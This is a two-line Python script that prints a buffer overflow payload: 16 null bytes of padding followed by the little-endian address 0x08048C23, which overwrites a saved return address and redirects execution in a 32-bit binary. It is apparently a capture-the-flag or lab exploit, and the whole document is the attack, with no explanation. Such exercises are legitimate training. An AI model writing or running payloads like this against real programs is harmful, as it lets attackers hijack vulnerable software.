import sys
sys.stdout.buffer.write(b"\x00"*16 + 0x08048C23.to_bytes(4, "little"))